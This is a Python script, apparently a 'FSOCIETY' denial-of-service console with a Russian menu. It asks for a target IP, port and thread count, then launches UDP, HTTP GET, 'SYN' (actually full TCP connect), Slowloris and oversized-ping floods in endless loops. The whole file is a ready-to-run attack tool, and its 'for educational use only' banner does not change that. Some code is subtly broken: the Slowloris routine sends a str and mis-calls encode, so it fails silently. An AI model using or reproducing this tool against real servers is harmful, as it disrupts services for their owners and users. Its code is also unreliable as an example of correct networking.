import os
import socket
import threading
import requests
import time
import random

from sys import platform

# Баннер
def banner():
    os.system("clear" if os.name == "posix" else "cls")
    print("""
███████╗███████╗ ██████╗ ██████╗  ██████╗ ███████╗████████╗██╗   ██╗
██╔════╝██╔════╝██╔════╝ ██╔══██╗██╔═══██╗██╔════╝╚══██╔══╝╚██╗ ██╔╝
███████╗█████╗  ██║  ███╗██████╔╝██║   ██║█████╗     ██║    ╚████╔╝ 
╚════██║██╔══╝  ██║   ██║██╔══██╗██║   ██║██╔══╝     ██║     ╚██╔╝  
███████║███████╗╚██████╔╝██║  ██║╚██████╔╝███████╗   ██║      ██║   
╚══════╝╚══════╝ ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚══════╝   ╚═╝      ╚═╝   
          FSOCIETY DoS ATTACK CONSOLE - For educational use only
""")

# UDP Flood
def udp_flood(ip, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes_data = random._urandom(1024)
    while True:
        try:
            sock.sendto(bytes_data, (ip, port))
        except:
            pass

# HTTP Flood
def http_flood(ip):
    url = f"http://{ip}/"
    while True:
        try:
            requests.get(url)
        except:
            pass

# SYN Flood
def syn_flood(ip, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    while True:
        try:
            sock.connect((ip, port))
            sock.send(b"X" * 1024)
        except:
            pass

# Slowloris
def slowloris(ip, port):
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, port))
            s.send("GET /" + str(random.randint(0,1000)) + " HTTP/1.1\r\n").encode()
            time.sleep(15)
        except:
            pass

# Ping of Death
def ping_of_death(ip):
    while True:
        try:
            os.system(f"ping -s 65500 {ip}" if platform != "win32" else f"ping -l 65500 {ip}")
        except:
            pass

# Меню
def menu():
    banner()
    ip = input("[+] Введи IP сайта или сервера: ")
    port = int(input("[+] Введи порт (например 80): "))

    print("""
[1] UDP Flood
[2] HTTP Flood
[3] SYN Flood
[4] Slowloris
[5] Ping of Death
""")

    choice = input(">>> Введи тип атаки: ")
    threads = int(input("[+] Сколько потоков запустить? (рекомендуется 50–100): "))

    for _ in range(threads):
        if choice == "1":
            threading.Thread(target=udp_flood, args=(ip, port)).start()
        elif choice == "2":
            threading.Thread(target=http_flood, args=(ip,)).start()
        elif choice == "3":
            threading.Thread(target=syn_flood, args=(ip, port)).start()
        elif choice == "4":
            threading.Thread(target=slowloris, args=(ip, port)).start()
        elif choice == "5":
            threading.Thread(target=ping_of_death, args=(ip,)).start()
        else:
            print("[!] Неверный выбор.")
            break

if __name__ == "__main__":
    try:
        menu()
    except KeyboardInterrupt:
        print("\n[!] Атака остановлена вручную.")